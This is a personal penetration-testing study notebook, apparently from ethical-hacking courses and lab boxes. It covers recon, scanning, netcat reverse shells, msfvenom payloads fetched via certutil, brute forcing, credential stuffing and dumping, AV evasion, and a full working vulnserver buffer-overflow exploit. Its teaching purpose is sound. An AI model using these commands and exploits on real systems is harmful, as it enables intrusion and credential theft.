----------------------------------------------------------------------
# screenshots
`flameshot` for Linux
`greenshot` for windows and mac

# notes
`KeepNote` http://keepnote.org/
`Joplin` https://github.com/laurent22/joplin

# networking Refresher
----------------------------------------------------------------------
`ifconfig`
    inet - IPv4 address
        192.168.1.1 -  (octet.octet.octet.octet) 
        octet = 8 bits
        32 bits = 4 bytes
    inet6 - IPv6 address
    
    `bianry` showing 1x octet
    128 64  32  16  8   4   2   1
    
    1   1   1   1   1   1   1   1   = 255
    
    0   0   0   0   0   1   1   1   = 7
    
    0   1   0   0   0   0   1   0   = 66
    
`NAT` Layer 3 (the router)
    network address translation (NAT) 
    `private IPs`                                  networks    hosts per net
        class a - 10.0.0.0                       126         16,646,144
        class b - 172.16.0.0 - 172.31.0.0        16,383      65,024
        class c - 192.168.0.0 - 192.168.255.255  2,097,151   254           
        loopback  127.0.0.0 - 172.0.0.7          -           -
    
`MAC` Layer 2 (physical, switching)
    media access controli (MAC)
    `ether` - MAC for a device    
    https://aruljohn.com/mac.pl

`Layer 4` transport layer
    `TCP` transmission control protocol
        connection oriented 
        `3 way handshake` SYN > SYN ACK > ACK (sender > receiver > sender)
            service ports
            FTP     21
            ssh     22
            Telnet  23
            SMTP    25 (mail)
            DNS     53
            http    80
            https   443
            POP3    110 (mail)
            SMB     139, 445 (fileshares win) (samba)
            IMAP    143 (mail)
    `UDP` user datagram protocol
        connectionless oriented (streaming)
            DNS     53
            DHCP    67, 68
            TFTP    69
            SNMP    161 (can gather community/public strings if used)
        
`OSI model`
    1 P please      Physical layer - data cables, Cat6
    2 D do          Data layer - switching, MACs
    3 N not         Network layer - IPs, routing
    4 T throw       Transport - TCP/UDP
    5 S sausage     Session management layer
    6 P pizza       Presentation layer - media, JPEG, MOV
    7 A away        Application layer - HTTP, SMTP
    
`subnetting`
                number of bits turned on    subnet
            1   2   3   4   5   6   7   8   255.0.0.0     = /8
            9   10  11  12  13  14  15  16  255.255.0.0   = /16
            17  18  19  20  21  22  23  24  255.255.255.0 = /24
            25  26  27  28  29  30  31  32
    
hosts       1   2   3   4   5   6   7   8
subnet      128 192 224 240 248 252 254 255

if you have 23 bits turned on: go right to the subnet 255.255.255.0. Then
go down

https://www.professormesser.com/network-plus/n10-007/seven-second-subnetting-2/

`Kali Linux`
----------------------------------------------------------------------

drwxr-xr-x [dir or file][owner][group][other]
    /tmp/ by default has ALL permissions, good place to work out of
    
`chmod 777` full file permissions

`adduser` add new user `/etc/passwd` to see users `/etc/shadow` u can `hashcat`
    then passwords mabe. add a user to the `sudoer` file to give them sudo 
    
`iwconfig` for wireless interfaces, `ifconfig` for lan interfaces

`ping` is `ICMP` traffic

`arp -a ` will show the ARP requests to the gateway matching IPs and MACs

`netstat -ano` active connections on machine

`route` routing table to see where traffic is going thru

`service apache2 start` starts an webserver on a local mechine with current
    IP address
    can edit page in `/var/www/html/index.html`
    `serivce apache2 stop` ends page
    
`python -m SimpleHTTPServer 8080` starts a file server for the `dir` you
    run the command in a desired port
    
`systemctl enable [service]` will start the service on boot (persistence)
    `postgresql` will make `metasploit` start faster
    
`apt install`
    `pip`  python install program
    
#5 Stages of Ethical Hacking
#   1 - Reconnaissance (active and passive)
#   2 - Scanning & Enumeration (nmap, nessus, nikto, ect)
#   3 - Gaining Access (exploitation)
#   4 - Maintaining Access (persistance)
#   5 - Covering Tracks (rm logs, malware, created accounts, ect)

# 1 - Recon
# Passive Recon
location info (building layout and security posture)
job info (name, job title, phone, manager, pics of badges, desks, computers,
ect)

    #web and hosts
    target validation - WHOIS, nslookup, dnsrecon
    finding subdomains - google fu, dig, nmap, sublist3r, bluto, crt.sh
    fingerprinting - nmap, wappalyzer, WhatWeb, BuiltWith, Netcat
    data breaches - HavelBeenPwned, Breach-Parse, WeLeakInfo
    
    #target validation
    `bugCrowd.com` is a bug bounty program 
    `hunter.io` - looks up emails for companies on the web (first, last name,
        email address, can export in .csv) can use for password spraying
    # breach-parse https://github.com/hmaverickadams/breach-parse
        has a 43gb database of breached emails and passwords
    look for repeat offenders and target them
    # theHarvester in kali does web searches for info
        `theHarvester -d tesla.com -l 500 -d google`
        this will search for the domain tesla for 500 searches on google
        will give you emails and subdomains
    # web info gathering
        `sublist3r -d tesla.com`
        looks for subdomains on ALOT of search engines
        `crt.sh`  is a site for finding registered certs (%.tesla.com)
        #OWASP-amass is the industry standard for finding subdomains
        https://github.com/OWASP/Amass
        https://builtwith.com   to see what the site is made with
        Wappalyzer for firefox tells you what is used to make up the site
        `whatweb https://tesla.com`     in kali for software versions running
            on site
        #burp Suite
        set up firefox > prefrences > Conenction settings > manual proxy >
            127.0.0.1 port 8080, check use this proxy for all FTP and HTTPS
            download CA cert from https://burp/ then firfox > pref > priviacy
            and secuirty > view certificates > import > pick the cert and check 
            both boxes
        in BurpSuite > proxy > Intercept is on/off > to check pages
        BurpSuite pro is $400 per year but worth it
        #google fu
        https://ahrefs.com/blog/google-advanced-search-operators/
        site:tesla.com                  #only returns from that site
        site:tesla.com -www             #removes www.'s for subdomains
        site:tesla.com filetype:pdf     #for only pdfs on the domain
        #social media
        linkdin.com, facebook, instagram, twitter

# 2 - Enumaration and active scanning

    #specify all commands with an `interface`!!!
        if `eth0` is `10.0.40.0` and you know there is a sub network of 
        `10.0.40.0` at say `10.0.30.0` to reach it you MUST specify the
        interface that is connected to `10.0.40.0` in this case `eth0`

    install kioptrix level 1 vm from vulnhub
    UN:john PW:TwoCows2
    
    `arp-scan -l`
    works like netdiscover
    `netdiscover -r 192.168.0.0/24`
    
    #nmap
    `nmap -A -T4 -p- <ip>`      
    -T1-5 for speed, -p- scan all ports default is top 1000, -A for everything
    `nmap -sU -T4 -p <ip>`
    UDP scan of top 1000
    
   
    
    ports 80, 443, 139(smb) are all low hanging fruit
    open webpages on 80 and 443
    
    #nikto
    web page vul scanner
    `nikto -h http://<ip>`
    
    #dirbuster
    `dirbuster &`
    it will run in the background and a gui will start
    browes > / > usr > share > wordlist > dirbuster > small list
    this is going to use the wordlist to find directories on the site.
    Add file extentions such as php,txt,zip,rar,pdf,docx
    Response Codes: 200 - good, 400 - nothing, 500 - error
    
    #firefox view page source
    
    #BurpSuite
    Proxy > intercept on > right click a packet > send to repeater >
        then you can edit the packet before you send it out
    Target > scope > just add the ips you care about
    Target > sitemap > / and others > to see if you can find server headers
        such as: Server: Apache/1.3.20
        
    #enumerating SMB port 139
    for file sharing, scanner folders
        
        #metasploit
        `auxiliary/scanner` for enumaration and to see if vulnerable
        
        #`smbclient`
        used to try and connect over smb
        `smbclient -L \\\\192.168.0.15\\`
            list out the fileshare dir
            if you get timeout error you need to add:
                `client min protocol = NT1` directly above the line:
                `## Browsing/Identification ###`
                https://dalemazza.wordpress.com/2020/04/20/nt_status_io_timeout-smb-error-and-how-to-fix-it/
        `smbclient \\\\192.168.0.15\\ADMIN$`
        once you get a list of Sharenames you can try and connect to one
        
    #enmueration SSH port 22
    just try to check the version by attempting a connections but Ctrl+C
        the password. Sometimes you will get a banner that leaks info
    for old ssh boxes and versions you need:
    `ssh 192.168.0.15 -oKexAlgorithms=+diffie-hellamn-group1-sha1 -c aes128-cbc`
    
    #research vulnerabilites
    low hanging fruit:
        80/443
        smb
        ssl
        
    exploit-db.com
    github
    Rapid7.com (they make Metasploit)
    
    `searchsploit Samba 2`
    exploitdb is on kali that u can search in terminal
    keep refining search more and more specific to get a smaller list
    `searchsploit Samba 2.2.1`
    
    #Scanning tools
    `Masscan` - scans the entire internet (scans all ports)
        `masscan -p1-65535 --rate 1000 192.168.0.15`
        scans ALL ports on the ip, very fast compaired to everything else
        find all the open ports and then use nmap to get the ALL details
        `nmap -T4 -p 22,80,111,139,443,32768 -A 192.168.0.15`
    `metasploit`
    search for portscan
    `auxiliary/scanner/portscan/syn` is a good one
    if a mechine don't have nmap you can run metasploit thru a shell
        for scanning
    `Nessus` - vulnerability scanner GUI
        `/bin/systemctl start nessusd.service` then open:
        https://kali:8834/
        once you get a scan finished click settings > disable groups
        can export results in word doc for clients
        worth buying at $2400 a month
       
# 3 - exploitation

    #netcat 
        https://www.hackingtutorials.org/networking/
        order matters here
        reverse shell
        attackbox(atb): `nc -lvp 4444`
        tgt: `nc <atb ip> -e /bin/sh`
            for windows use `command.exe` instead of `/bin/sh`
        
        bind shell (can bypass a firewall)
        tgt: `nc -lvp 4444 -e /bin/sh`
        atb: `nc <tgt ip> 4444`
        
            
    #root with metasploit
        stage/non-stage payloads 
            payloads are exploits
            `staged` send payload in stages can be less stable (more`/`)
                `windows/meterpreter/reverse_tcp`
            `non-stage` sends entire payload at once don't always work
                `windows/meterpreter_reverse_tcp`
            if one type don't work than try the other
            
        #attacking SMB (ports 139,445)
            find a module that fits linux and the smb versions such as
                `trans2open` witch works with Samba 2.2.x
            if it don't work think about changing the payload with:
                `set payload lin` then tab complete and double tab for a 
                list of payloads. If you WERE using a staged, try switching
                to a non-staged such as `linux/x86/shell_reverse_tcp`
            from `nmap -A` look for Host script results > smb-secuirty-mode >
                message_signing: disabled or message_signing: enabled but
                    not required - is super broken!!! 
            `scanner/smb/smb_version` in metaploit to id smb
                
    #root with OpenFuck on Apache
        `./OpenFuck`
            to see all all options, then pick on that matches:
                os, and apache version
        `./OpenFuck 0x6b <tgt ip> -c 40`
        if it works it will download software on the box and then you 
            get a shell
        `cat /ect/passwd` to check for users, they start at 500
        `cat /etc/shadow` to see the password hashes
        
    #brute force passwords
        super load but during a pentest we want to get caught
        in a read team assesment we don't
        #hydra
            `hydra -l root -P /usr/share/wordlist/metasploit/unix_passwords.txt ssh://<tgt ip> -t 4 -V`
            ssh brute force with user root, -l, passwords from list -P, 4
                threads at a time -t 4, and verbosisty -V
            `hydra-wizard` for prompting and command building
          
                
        #metasploit
            search for ssh login scanner such as scanner/ssh/ssh_login
            
        #impacket
            metasploit is picked up by AV alot, so you can use impacket if you want to be
                sneakyer when running stuff like `pxexec.py, smbexec.py, wmiexec.py`
            
    #cred stuffing
        injecting breached creds in hope of account take over
            finding creds from a breach or a leak and using them on 
            other servers that the user might have accounts on
        
        #BurpSuite
            #foxy proxy
                easy extention for burpsuite
            with `intercept on` sign into the site with test creds
            from Proxy > Raw > forward untell you see your test creds
                at the bottom of the page
            right click > send to intruder > go to intruder tab
            click clear > then highlight the email, test%40test.com, and click
                add. Do the same for the password
            `attack type` pitchfork
            `payloads` payload set 1 > copy usernames in
            payload set 2 > copy passwords in
            
            once it runs you are looking for:
                status other than 200
                or segnifigant page lengths might me a log in
            you can also password spray with username and password lists that 
                are not specific
            `attack type` sniper is an email list and using a single password
           
    #Lessons learned from Hack the Box
        when using HackTheBox your LHOST (you) will need to the the IP shown
            in when the VPN is on from HackTheBox under: OpenVPN Connection >
            IP Address
        looking for flags: `root.txt`  and `user.txt`
        * msfvenom cheat sheet https://netsec.ws/?p=331
        * list of new vulns https://nvd.nist.gov/
        
        * `/etc/samba/smb.conf` add `client min protocol = CORE` so kali
            will see smb version 1 by default
            
        shell on windows box
            `id` tells us aour uid, gid, groups
        
        from `meterpreter` shell
            * NT AUTHORITY/SYSTEM for windows is ROOT on linux
            * `getinfo` and check to see that the box Architecture matches
                the meterpreter 
            * `help` in meterpreter will display commands
            * `hashdump` will show all hashed user passwords. Then use
                `john the ripper` or `hashcat` to crack against wordlist.
                take the second part of the hash after `:` and try to
                pass the hash with `psexec` or `crackMapExec`. The
                Admin hash is used alot for all boxes on a network so passing
                the hash from an Admin works somtimes.
            * `shell` to drop into a shell on the box
            * `getsystem` will try to escalate privileges (can crash box)
            
            #on linux box
                * `updatedb` to update commands
                * `locate <filename>` to search for a file
                * `/etc/passwd` look for real users above 500
                * `/ect/shadow` to see hashed passwords
                * `unshadow <shadow> <passwd>`
                    copy `/etc/shadow` and `/etc/passwd` to local mechine
                    then run `unshadow` to get a format you can use
                    in `hashcat` to crack the hashes. Save just the users
                    you with hashes to a file (username:hash) drop the rest
                * `hashcat --force -a0 -<hashType> <user&hashFile> <worklist> --username`
                    hashtype is the `$id$` such as MD5 `-m0` and MD5 crypt
                    `-m500`
                * `https://crackstation.net/` can also be used to for hashes
                * `ftp <rhost>` use `anonymous` as user to see if we can see
                    or upload/download files
                * `searchsploit` to look for metasploit modules about
                    specific thins such as `apache 2.4`
                * if port `80` is hosting a webserver ALWAYS go to it in the 
                    browser and start there! try `nikto`, `dirbuster`,
                    `wappalyzer`, viewing page source, `cewl` to make custom
                    password lists, `burpsuite`
                * from linux shell `sudo -l` will show you what the user can
                    run without sudo password. if you find that you can run
                    a script as sudo with no password then make a script with 
                    that name containing only: `bash -i` this will give you 
                    a root bash interactive shell
                * `history` to see what the last user was typeing
                * `LinEnum.sh`      https://netsec.ws/?p=309
                    http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
                * `Linuxprivchecker.py`
                * `php-reverse-shell.php` can be uploaded to a web server
                    and once you navigate to it in the browser you can get a 
                    shell from `nc -nvlp <port>`
                * `no tty present` means no tellaType when running cmds or
                    trying to `su` so you need to tty escape such as:
                    `python -c 'import pty; pty.spawn("/bin/bash")'`
                    https://netsec.ws/?p=337
                * `sudo -u <username> <command>` to run a command as a user
                * Reverse Shell Cheat Sheet
                  http://pentestmonkey.net/category/cheat-sheet
                  look at cron jobs to see if anyone scripts run as root
                    and change one to be a reverse shell code call out!
                    
                  
                    
            #on Windows box
                `NT AUTHORITY\SYSTEM` is `root` in windows
                * shell commands
                    `dir /b/s *.<fileExtension>` search current dir for all
                        files of that type
                    `dir *<filename>*.* /s` search file by name
                * `psexec <user>:'<password>'@<ip address>`
                    `smbexec` and `wmiexec` have the same sintax. Use with `impacket`
                        outside of `metasploit` to get around AV. smb and wmi
                        are eayer to get pas AV with less functionality
                        
                * FTP 
                    port 21 for FTP
                    all we can do is `put` (upload) or `get` (download) files with this and
                        we can't exicute any. But if we can `put` malware 
                        on the server then, if there is a webpage, we can 
                        use the webpage to exicute the malware
                    when moving around in FTP if a dir is denied access try
                        doing an absolute path deeper in the dir and it might
                        let you in. Try to find log files or creds to use
                        with other exploits.
                    port 80/443 showing `IIS` is default webpage
                    `dirbuster` to brute for dirs on the webpage
                        File extension: asm,asmx,asp,aspx,txt,zip,bak,rar,sql
                    `ftp <rhost>`
                    `anonymous` or don't enter anything for user
                    `help`      for commands when connected by ftp
                    `put <file>`        to transfer a file to the box
                        this is useful to get malware on a box but you need
                        someone to run it or you need an account to run it
                        yourself. Maybe use this on an unsecured server and
                        have it as instructions
                    `msfvenom` to make malware and then set up a handler on 
                        metasploit
                        `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f aspx > ex.aspx`
                        in metasploit `use exploit/multi/handler`
                        `set payload windows/meterpreter/reverse_tcp` this
                            payload must match the one in your malware
                    transfer the malware to the box with `put`. if there is
                        an issue then use the command `binary` to switch from
                        ASCII to binary and use `put` again
                    run the malware via browser. `<ip address>/malwareName`.
                        when the browser calls the file it will run on the
                        box and you get a call back in metasploit
                    if no root user we need to escalate.
                        in meterater `bg` the session and use
                        `multi/recon/local_exploit_suggester` and run 
                        at your session. This will scan to see if any of the
                        modules can escalate privileges on this box.
                    * be sure to use different LPORTs for EACH session!
                * `default web page` Apache Tomcat/7.0.88
                    get default creds from the webs
                    use `burpSuite` with intercept on try to login with 
                        a set of creds
                    look for the username and password you entered in the
                        packets. If you find `Authorization Basic <some code>`
                        highlight it and right click > send to decoder. Then
                        you can try to decode it with a few types. An ending
                        in `==` means Base64. Then you can send to intruder and
                        repeater to brute force with a list
                    to make a username and password list for burpsuite, it
                        needs to be in format `username:password`
                    if you needed to convert these to Base64 you could run:
                    `for cred in $(cat <list>); do echo -n $cred | base64; done`
                    copy the Base64 usernames and passwords.
                        In BurpSuite > Intruder > highlight the base64 part of the
                        Authorization: Basic > Add. this will be what we will
                        replace. use Sniper. Payloads > paste. Uncheck URL-encode
                        these charaters. Start Attack > look for a code other than
                        `401`. Then highlight the Base64 > send to Decoder and turn
                        back into ASCII and use that to log in!!!
                    Tomcat uses WAR files so we can add malware as a WAR file
                        so use `msfvenom` to make a WAR malware to make a WAR
                        malware
                        use either metasploit or nc to catch the callback:
                            `nc -nvlp <lport>`
                        to force the webpage to run it while logged into
                            Tomcat, click your uploaded WAR file
                        `nc` will catch the shell!!!
                * with `nt authority\system` to improve shell
                    make malware with msfvenom and start listner in metasploit
                    upload malware to a self hosted web server
                        `python -m SimpleHTTPServer 80` will make a web server
                            on port 80 starting from whatever `dir` you
                            launched it from.
                        from our shell on the box, pull the malware to the box
                            from your web server (could be stopped by Windows
                            Defender): `certutil -urlcache -f http://<ip to web server/<file>`
                        once transfered run it in the shell to get a callback
                        in metasploit.
                            `powershell` to turn windows shell into powershell
                            and then `curl <web server ip/malware> -O <whereyouwantit>`
                            to download a file from your webserver onto windows
                            box
                    * find privilege escalation with metasploit on windows box
                        `bg` your session
                        `search suggester` and use it
                        `set session <the one with the shell>`
                        this will give you a list of modules that might work
                            so pick one and run it!
                        `sessions -i <id>` to swtich to that session
                        the windows privilege escalation bible:
                        https://www.fuzzysecurity.com/tutorials/16.html
                        * `Sherlock.ps1`
                            Manual way of searching for privilege escalation
                                on the box vulnerabilities on windows:
                            `powershell.exe -exec bypass sherlock.ps1 -Command "& {Import-Module ./sherlock.ps1; Find-AllVulns}"` 
                                will bypass protections to run malware
                        * `wesng` windows escalation suggester - next gen
                            can run the checker OFF the box with the sysinfo
                            get shell on box and run `systeminfo`. copy output
                                and save to .txt
                            `/opt/wesng` run `python3 wes.py --update`
                            `python3 wes.py -e <systeminfo.txt>` and you will
                                get a list of vulns with known exploits
                            then use metasploit or download the exploit from
                                explopitDB or simply `searchsploit` for it
                        * `stdapi_sys_config_getsid: Operation failed: Access is denied`
                            when trying to use `getuid` look at migrating:
                            in metasploit `post/windows/manage/migrate module`
                            if it works, `sessions <number>` to get back to
                            your session
                            
                            also try `ps` to see what service we are. 
                            try `migrate <pid>` to a service running as user.
                            
                        
                * eternal blue: ms17-010
                    `scanner/smb/smb_ms17_010` to see if its vuln to EB
                    `windows/smb/ms17_010_eternalblue` may not work on the
                    first try
                    `getuid`        to see our user
                    `sysinfo`       to see system info
                    `hashdump`      to see users and hashed passwords
                    `shell`     to get a WINDOWS shell
                        `tree /F`       to see ALL files in dirs
                        `type <filename>`       to `cat` a file
                        `route print` to get a route table
                        `arp -a`    to get arp table
                        `netstat -ano`  see whats running
                        `dir`           like `ls` on windows
                        `cd c:\\`       to get to root dir
                    `load kiwi`     the new memicats
                        `help`          for help
                        `creds_all`     will get creds for all currently  
                            logged in 
                        `lsa_dump_sam`
                        `lsa_dump_secrets`
                    `load incognito`
                        `list_tokens -u` used to impersonate a user
                        `"file with spaces"`    to access files with spaces
                    * using `AutoBlue-MS17-010`
                        from the AutoBlue dir in /opt/
                        `python3 eternalblue_checker.py <rhost>`
                            to see if it is patched or not
                        run `shellcode/shell_prep.sh` to make a payload
                        run `.listner_prep.sh`
                            this will start metasploit, open new tab
                        run `python3 eternalblue_exploit7.py <rhost> shellcode/sc_all.bin`
                            sc_all.bin is the msfvenom script we made with
                            shell_prep.sh
                        in metasploit use `sessions` to see and select the
                            session created by AutoBlue
                            
#Buffer Overflows
    Anatomy of Memory
        Kernal  top
        Stack
            ESP (extended Stack Pointer)                            top
            Buffer Space
            EDP (Extended Base Pointer)
            EIP (Extended Instruction Pointer) / Return(pointer) Address     bottom
        Heap
        Data
        Text    bottom
        
        `Stack` - works from top to bottom. When the `stack` gets input charaters
        it fills up from top to bottom. If it is properly sanitized when
        its gets to the bottom of the buffer space it when it gets to 
        `EDP`. In a `buffer overflow` instead of stopping at the bottom of
        the `buffer space` the inputs flow over the `EBP` and into the
        `EIP`. If we end in the `EIP pointer address` at code we want to run. 
            `spiking` - find a vuln part of a program
            `fuzzing` - send a bunch of charaters to see if it breaks
            If it does break, `find the Offset` - where it broke
            Use `offset` to over write the `EIP` 
            Once we have `EIP` controlled we:
                find `band characters` and `right module`
            then we `generate shell code`
            then we get `root!`
            
        range setup - run vulnserver and immunity as admin. 
            immunity > file > attach > vulnserver
            press play
            from kali connect with `nc -nv <ip> 9999`
            
    `spiking` try multiple commands to see if any are vuln to `BO`
        use `generic_send_tcp <ip> <port> <script>.spike 0 0`
            if we get an overflow it will crash the server, try `stats`
            then `trun`
            
            `stats.spike` script:
            s_readline();
            s_string("STATS ");
            s_string_variable("0");    
        
            `trun.spike` script:
            s_readline();
            s_string("TRUN ");
            s_string_variable("0");    
            
    `fuzzing` send alot of charaters at the vuln command found in `spiking`
        
            fuzz.py
            #!/usr/bin/python
            import sys, socket
            from time import sleep
            
            buffer = "A" * 100
            
            while True:
                try:
                        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                        s.connect(('172.16.253.150', 9999))
                            
                        s.send(('TRUN /.:/' + buffer))
                        s.close()
                        sleep(1)
                        buffer = buffer + "A"*100
                                 
                except:
                        print "Fuzzing crashed at %s bytes" % str(len(buffer)) 
                        sys.exit()
                        
        run the script and when it ends it will tell you around where it
        crashed in byes. Now we can use the number of bytes and figure out
        the exact location of the `EIP` and the `offset`
        
    finding the `offset`    
        `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000`
        this will make a cyclical chain of charaters that we need for
        `fuzz_offset.py`
            `fuzz_offset.py`
            #!/usr/bin/python
            import sys, socket
            
            offset = "<cyclical chain>"
            
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('172.16.253.150', 9999))
                s.send(('TRUN /.:/' + offset))
                s.close()
                            
                except:
                print "error connecting to server... you fucked somthing up"
                sys.exit()
                
        it should crash the server. Notice the `EIP` value
        `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q <eip value>`
        this will give us the exact `offset`. this is the exact number of bytes
        before the 4 byte `EIP`
        
    overwritting the `EIP` with `offset`
        `eip_checker.py`
        #!/usr/bin/python
        import sys, socket
        
        shellcode = "A" * <offset> + "B" * 4
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('172.16.253.150', 9999))
            s.send(('TRUN /.:/' + shellcode))
            s.close()
                        
            except:
            print "error connecting to server... you fucked somthing up"
            sys.exit()
            
        in the `eip` if it works we should see 42424242 which means 4 B's
        now we know where the exact location of the `EIP` is at!
        
    find bad charaters
        we need to find out which chars are bad that we CAN'T use in
        our shell code.  by defualt x00 (the null byte) will be bad
            `badchars_checker.py`
            #!/usr/bin/python
            import sys, socket
            
            badchars =
            ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
            "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
            "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
            "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
            "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
            "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
            "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
            "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
            
            shellcode = "A" * 2003 + "B" * 4 + badchars
            
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('172.16.253.150', 9999))
                s.send(('TRUN /.:/' + shellcode))
                s.close()
                        
                except:
                print "error connecting to server... you fucked somthing up"
                sys.exit()
                
        in immunity highlight the `ESP` value > Rclick > follow in dump
        then in the hex dump we can see all our charaters sent. We are looking
        for anything out of place (from `01` to `FF`) so if you see:
        `3A 3B B0 3D` then `3C` is missing and would be a badchar. A
        badchar will not alwasy be `B0` but will always be the same.
        
    Finding the right module
        looking for a `dll` for something similar in a program that 
        has no memory protections such as no dep, no aslr, no safeseh, ect
        `mona modules` will help us do that. Get `mona.py` from github
        and put it in the windows vm:
        `ThisPC: > LocalDisk(C:) > Program Files (x86) > Immunity INC > Immunity Debugger > PyCommands`
        bottom left of Immunity type: `!mona modules` it will pop up in green
        looking for somthing attached to vulnserver with all falses such
        as `essfunc.dll`
        
        find the opcode equivilent (covert assemble lang to hex code) 
        of a jump in kali
        `locate nasm_shell`
        copy: `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`
        and run in term.
            `JMP ESP`
                we see that the hex code of `JMP ESP` is `FFE4`
        in immunity: `!mona find -s "\xff\xe4" -m essfunc.dll`
        this is going to run `JMP ESP` (\xff\xe4) in essfunc.dll
        looking for `return addresses` such as `625011af`
        use each address in a script tell you find XXXX
        (`x86` stores the `low order byte` at the lowest address and
        the `high order byte` at the highest address, ie backwards)
        in immunity: click > go to address in Dissassembler > enter the
        jump code. Top left box will take you to that and should show 
        that it is a `JMP ESP`. highlight it and press `F2` to set a break
        point so it will stop for testing instead of jumping to other code.
            `module_finder.py`
            #!/usr/bin/python
            import sys, socket
            
            #return_address = 625011af
            #enter the return address in little endian format (backwards) for x86
            endian_return = "\xaf\x11\x50\x62" 
            
            shellcode = "A" * 2003 + endian_return 
            
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('172.16.253.150', 9999))
                s.send(('TRUN /.:/' + shellcode))
                s.close()
                            
                except:
                print "error connecting to server... you fucked somthing up"
                sys.exit()
                
        Get root!
            `msfvenom -p windows/shell_reverse_tcp LHOST=172.16.253.147 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00" `
            -p windows/shell_reverse_tcp = payload target/what shell we want
            LHOST = me  LPORT= me port we have a listner on
            EXITFUNC = makes explooiit more stable
            -f = file type, in this case c
            -a = architecture
            -b = list any bad charaters, `\x00` is null byte and is always bad
            
            run root_baby.py to get root with shell code from msfvenom:
                `root_baby.py`
                #!/usr/bin/python
                import sys, socket
                
                #return_address = 625011af
                #enter the return address in little endian format (backwards)
                for x86
                endian_return = "\xaf\x11\x50\x62" 
                
                #get overflow from:
                #msfvenom -p windows/shell_reverse_tcp LHOST=<my_ip> LPORT=<listner_port> EXITFUNC=thread -f c -a x86 -b "\x00"
                overflow = (
                <msfvenom x86 code>)
                
                #no operations used as padding between JMP and overflow. This
                #ensures that no other unknown commands will run in the 
                #nops area. You might need to make this bigger or smaller to work.
                nops = "\x90" * 32
                
                shellcode = "A" * 2003 + endian_return + nops + overflow 
                
                try:
                    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    s.connect(('172.16.253.150', 9999))
                    s.send(('TRUN /.:/' + shellcode))
                    s.close()
                                
                    except:
                    print "error connecting to server... you fucked somthing up"
                    sys.exit()
                                        
            set up listener: `nc -nvlp 4444` and run `root_baby.py` and 
            you got root!
            
    #Active Directory
        the phonebook for Windows domain networks, stores info related to:
        objects, Computers, Users, Printers, ect. Authenticates using Kerberos
        tickets. non-Windows devices authenticate to AD via RADIUS and LDAP.
        Most common identity managemenet (95% of Fortune 1000 use it).Don't
        need exploits, we can abuse features, trusts, compenents, policy, ect.
        
        Physical AD Components
            `Domain Controller`: main tgt! server that hosts the AD DS directory store,
            provides authentication and authorization services, replicates
            updates to other domain controllers in the domain and forest.
            allows admin access to manage accounts and net resources. If you 
            get this... you got it all, most of the time!
                AD DS Data Store:
                    contains database files, processes the store, and
                    manage directory info for users, services, and apps
                    consists of the `Ntds.dit` file:
                        everything for users, obj, groups, all user 
                        password hashes. default path is:
                        `%SystemRoot%\NTDS` on all domain controllers.
                        Only accessable thru domain controller processes
                        and protocols.
                                   
        Logical AD Components
            `AD DS Schema`: enforces rules on object creation and defines 
                objs.
            `Domains`: used to group things together, admin boundary for
                policies, replication boundary between DCs, authentication and
                auth bountrary for access.
            `Trees`: hieracrchy of domains AD DS, parent domain with child
                domains. default is two way trust with domains in tree
            `Forest`: collection of Trees. share: common schema, configuartion
                partition, global catalog for search, turst between all
                domains in forest, Enterprise Admins and Schema Admins groups.
            `Organizational Units (OUs)`: containers for users, groups,
                computers, and other OUs
            `Trusts`: user access to another domain.Directional: from one
                trusting domain to trusted domain. Transitive: extended beyond a 2 domain
                to include other trusted domains. All domains in a Forest have
                trust with other domains in forest.
            `Objects`: inside of OUs: user, InetOrgPerson, Contacts, Groups,
                Computers, Printers, Shared Forlders, ect
                
        Attacking DC
            `https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa`
            #LLMNR (new name for NETBIOS) 
                used to id hosts when DNS fails 
                (if LLMNR fails, it will use BNT-NS) White listing MACs will
                prevent this attack or make passwords hard to crack (+14chars)
